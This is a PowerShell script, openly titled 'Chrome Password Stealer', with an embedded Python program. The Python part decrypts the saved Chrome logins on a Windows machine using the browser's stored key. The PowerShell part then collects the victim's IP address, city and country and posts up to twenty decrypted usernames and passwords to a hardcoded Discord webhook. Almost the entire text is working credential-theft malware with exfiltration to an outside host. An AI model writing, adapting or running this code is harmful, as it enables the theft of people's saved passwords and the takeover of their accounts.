# Chrome Password Stealer - Based on zubairjammu786's approach

Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan

$pythonScript = @'
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = os.path.join(os.environ["TEMP"], "ChromeData.db")
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    results = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        
        if username or password:
            results.append({
                "url": origin_url,
                "username": username,
                "password": password
            })
    
    cursor.close()
    db.close()
    
    try:
        os.remove(filename)
    except:
        pass
    
    print(json.dumps(results))

if __name__ == "__main__":
    main()
'@

$scriptPath = "$env:TEMP\chrome_decrypt.py"
$pythonScript | Out-File $scriptPath -Encoding UTF8

Write-Host "Installing dependencies..." -ForegroundColor Yellow
python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null

Write-Host "Extracting passwords..." -ForegroundColor Yellow
$output = python $scriptPath 2>&1 | Out-String

try {
    $passwords = $output | ConvertFrom-Json
    
    Write-Host "Found $($passwords.Count) passwords!" -ForegroundColor Green
    
    # System info
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    # Format for Discord
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.url)**`nUser: ``$($p.username)```nPass: ``$($p.password)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:globe_with_meridians: $ip - $city, $country

**🔐 Chrome Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Write-Host "Sending to Discord..." -ForegroundColor Yellow
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Write-Host "Sent to Discord!" -ForegroundColor Green
    
    # Save locally
    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
    $passwords | ConvertTo-Json | Out-File $outFile
    Write-Host "Saved to: $outFile" -ForegroundColor Cyan
    
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Raw output:" -ForegroundColor Yellow
    Write-Host $output
}

Remove-Item $scriptPath -ErrorAction SilentlyContinue
Read-Host "Press Enter"
